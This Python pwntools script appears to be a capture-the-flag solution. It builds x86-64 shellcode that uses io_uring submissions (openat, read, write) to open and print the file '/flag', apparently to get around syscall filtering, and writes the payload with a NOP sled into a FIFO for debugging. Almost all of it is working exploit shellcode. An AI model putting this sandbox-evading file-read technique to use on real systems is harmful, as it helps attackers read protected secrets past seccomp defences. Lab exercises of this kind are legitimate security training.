from pwn import *
import os

# PwnTools Context ---
context.arch = 'amd64' 
context.bits = 64
context.os = 'linux'
context.log_level = 'info'

# Generate the shellcode to read the flag using io_uring
def gen_shellcode():
    shellcode = asm(f"""
call get_pc                 /* Get PC for PIC base */
get_pc:
pop rbp                     /* rbp holds the base address */

sub rsp, 0x2000             /* Allocate and ALIGN RSP to a 4096-byte (0x1000) boundary */
mov r13, rsp
mov r12, 0xfffffffffffff000 /* 4096-byte alignment mask */
and r13, r12                /* r13 is now aligned RSP address (rings_stack) */
mov rsp, r13                /* Set aligned address as the new RSP */

mov r12, rsp                /* r12 = rings_stack (CQ ring & internal data base) */
mov r13, rsp                /* r13 = sqes_stack (SQE array base) */
add r13, 0x1000    

mov r15, r13                /* r15 = address of buf (r13 + 0x100, scratch space) */
add r15, 0x100              /* Go past sqes[0..3] */

mov rdi, r12                /* Start at rings_stack (r12) */
mov rcx, 0x2000             /* Length = 8192 bytes */
xor rax, rax
rep stosb                   /* Clear rings_stack and sqes_stack */

mov r15, r13
add r15, 0x100              /* Point r15 to the scratch buffer */

mov rax, 0x00550067616c662f /* Setup path "/flag" */
mov qword ptr [r15], rax
mov r14, r15                /* r14 = address of "/flag" for OPENAT */

mov rdi, r12                /* Setup io_uring_params p on the stack */
sub rdi, 0x100              /* rdi = address of p */
mov rcx, 0x80
xor rax, rax
rep stosb                   /* memset(p, 0, 128) */
mov rsi, rdi                /* rsi = &p */

mov dword ptr [rsi], 0x8        /* Set p.sq_entries = 8 (offset 0x0)  */
mov dword ptr [rsi+4], 0x8      /* Set p.cq_entries = 8 (offset 0x4)  */
mov dword ptr [rsi+8], 0x14000  /* Set p.flags = 0x14000 (offset 0x8) */                      

mov qword ptr [rsi+0x48], r13   /* Set p.sq_off.user_addr = sqes_stack (r13) (OFFSET: 0x48)  */
mov qword ptr [rsi+0x70], r12   /* Set p.cq_off.user_addr = rings_stack (r12) (OFFSET: 0x70) */

mov rax, 425                /* __NR_io_uring_setup  */
mov rdi, 8                  /* sq_entries           */
syscall                     /* rsi = &p             */
mov ebx, eax                /* ebx = ring_fd        */

mov rcx, r13                /* rcx = sqes (sqes_stack) */
mov rdi, rcx                /* rdi = address of sqes[0] */

mov byte ptr [rdi], 18              /* sqe.opcode = 18 */
mov dword ptr [rdi+4], 0xffffff9c   /* sqe.fd = -100 */
mov qword ptr [rdi+0x10], r14       /* sqe.addr = r14 */
mov dword ptr [rdi+0x1c], 0         /* open_flags (O_RDONLY = 0) at offset 0x1c (28) */

mov r8, r12                 /* r8 = rings_stack (Mapped Ring Base) */
add r8, 0x4                 /* sq_off.tail offset (4) */
inc dword ptr [r8]          /* Update sq_tail */

mov rax, 426                /* __NR_io_uring_enter */
mov rdi, rbx                /* ring_fd */
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0 
mov r9, 0 
syscall                     /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit OPENAT */

mov rdx, r12                    /* Get fd from cqe[0].res */
add rdx, 0x40                   /* rdx = CQE array base */
mov esi, dword ptr [rdx + 0x8]  /* esi = fd = cqe[0].res (offset 0x8) */

mov r8, r12                     /* Update cq_head after OPENAT retrieval */
add r8, 0x8
inc dword ptr [r8]

mov rdi, r13                    /* READ - Prepare sqe 1 */
add rdi, 0x40                   /* rdi = address of sqes[1] */

mov byte ptr [rdi], 22          /* sqe.opcode = 22 (IORING_OP_READ) */
mov dword ptr [rdi+4], esi      /* sqe.fd = esi (opened file descriptor) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov qword ptr [rdi+0x18], 100   /* sqe.len = 100 */


mov r8, r12                     /* Update sq_tail for the second submission */
add r8, 0x4
inc dword ptr [r8]

mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall                         /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit READ */

mov r8, r12                     /* Get bytes read (r) from cqe[1].res */
add r8, 0x40                    /* r8 = CQE array base */
add r8, 0x10                    /* r8 points to start of cqe[1] */
mov r10d, dword ptr [r8 + 0x8]  /* r10d = bytes read (cqes[1].res) */

mov r9, r12                     /* Update cq_head after successful retrieval */
add r9, 0x8                     /* r9 = cq_head address */
inc dword ptr [r9]

mov rdi, r13                    /* WRITE - Prepare sqe 2 */
add rdi, 0x80                   /* rdi = address of sqes[2] */

mov byte ptr [rdi], 23          /* sqe.opcode = 23 (IORING_OP_WRITE) */
mov dword ptr [rdi+4], 1        /* sqe.fd = 1 (stdout) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov dword ptr [rdi+0x18], r10d  /* sqe.len = r10d (bytes read) */

mov r8, r12                     /* Update sq_tail for the third submission */
add r8, 0x4
inc dword ptr [r8]

mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall                         /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit WRITE */

mov r9, r12                     /* Final cq_head update for WRITE result */
add r9, 0x8
inc dword ptr [r9]

xor edi, edi
mov rax, 60
syscall                         /* Exit cleanly */
    """)
    return shellcode

# Pipe bytecode to pipe to help with parallel GDB debuging 
out_fifo_path = "/home/hacker/my_fifo_stdin" 

def to_fifo(context, data): 
    input("Press ENTER to send %s payload to fifo..." % context) 

    with open(out_fifo_path, 'wb') as fifo: 
        fifo.write(data) 

if __name__ == "__main__":
    
    # Test the shellcode 
    shellcode = gen_shellcode()
    to_fifo("shellcode", b'\x90' * 100 + shellcode)